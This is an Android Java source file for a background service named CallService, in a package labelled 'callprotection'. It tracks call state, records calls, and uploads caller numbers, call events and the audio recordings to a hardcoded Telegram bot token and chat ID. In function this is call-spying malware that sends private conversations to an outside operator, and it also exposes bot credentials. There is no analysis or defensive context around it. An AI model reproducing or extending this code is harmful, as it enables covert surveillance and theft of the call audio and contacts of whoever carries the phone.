package com.daria.callprotection;

import android.widget.Toast;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class CallService extends Service {
    private static final String TAG = "CallService";
    private static final String CHANNEL_ID = "CallServiceChannel";
    private static final String TELEGRAM_BOT_TOKEN = "8374948696:AAHaTWuJK32nXqEphKOMjM17iq_2NuyrjAU";
    private static final String TELEGRAM_CHAT_ID = "-4910513519";

    private TelephonyManager telephonyManager;
    private PhoneStateListener phoneStateListener;
    private CallRecorder callRecorder;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "CallService created");

        createNotificationChannel();
        startForeground(1, getNotification());

        callRecorder = new CallRecorder(getApplicationContext());

        telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                String msg = "📞 Состояние вызова: " + state + ", Номер: " + incomingNumber;
                Log.d(TAG, msg);
                sendToTelegram(msg);

                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        sendToTelegram("📲 Входящий вызов от: " + incomingNumber);
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        sendToTelegram("✅ Вызов начат. Запись...");
                        callRecorder.startRecording();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:
                        sendToTelegram("❌ Вызов завершён. Остановка записи...");
                        File recordedFile = callRecorder.stopRecording();
                        if (recordedFile != null && recordedFile.exists()) {
                            TelegramUploader.uploadFile(getApplicationContext(), recordedFile, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                        } else {
                            sendToTelegram("⚠️ Файл записи не найден");
                        }
                        break;
                }
            }
        };

        if (telephonyManager != null) {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
            Log.d(TAG, "PhoneStateListener зарегистрирован");
        } else {
            Log.e(TAG, "TelephonyManager is null");
            sendToTelegram("❗ Ошибка: TelephonyManager is null");
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "CallService Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Channel for CallService");

            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("CallService Активен")
                .setContentText("Отслеживание звонков")
                .setSmallIcon(R.mipmap.ic_notification) // Убедись, что такой ресурс есть
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String data = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Ошибка отправки в Telegram", e);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CallService запущен");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (telephonyManager != null && phoneStateListener != null) {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
            Log.d(TAG, "PhoneStateListener остановлен");
        }
        sendToTelegram("🛑 CallService остановлен");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
